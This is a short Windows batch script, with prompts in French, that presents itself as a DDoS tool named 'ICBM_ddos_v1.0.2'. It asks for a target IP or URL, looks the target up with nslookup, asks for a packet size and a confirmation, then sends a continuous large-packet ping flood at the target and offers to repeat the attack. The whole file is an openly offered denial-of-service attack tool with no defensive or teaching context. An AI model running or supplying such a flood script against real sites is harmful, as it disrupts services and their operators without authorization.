@echo off
title -------- ICBM_ddos_v1.0.2 --------
:loading
cls
color 0a
set /p ip=Quelle est l'adresse ip / url du site a DDOS ? : 
echo --------------------------------------------------
echo ----------     Informations serveur     ----------
echo --------------------------------------------------
nslookup "%ip%"
echo --------------------------------------------------
echo ----------     Informations serveur     ----------
echo --------------------------------------------------

set /p nboctets=Combien de paquets d'octets voulez-vous envoyer (max 65500) ? : 
echo _____________________________________________________________________
set /p attackconfirmation=Confirmer l'attaque de ce site ? (si oui tapez "y" sinon tapez "n") : 
echo _____________________________________________________________________

if /I "%attackconfirmation%"=="y" (goto :fire)
if /I "%attackconfirmation%"=="n" (goto :annulation)

:fire
echo _________________________________
echo L'attaque a ete lance avec succes
echo _________________________________
echo **** Pour annuler l'attaque, faites CTRL+C ****
ping "%ip%" -t -l "%nboctets%"
pause
goto :link

:annulation
echo __________________________________
echo L'attaque a ete annule avec succes
echo __________________________________
pause
:link
echo ________________________________________________________________________
set /p reload=Voulez vous recommencer une attaque?(si oui tapez "y" sinon tapez "n") :
echo ________________________________________________________________________
if /I "%reload%"=="y" (goto :loading)
if /I "%reload%"=="n" (goto :exit)

:exit
echo ICBM_ddos_v1.0.2 va se fermer 
pause
exit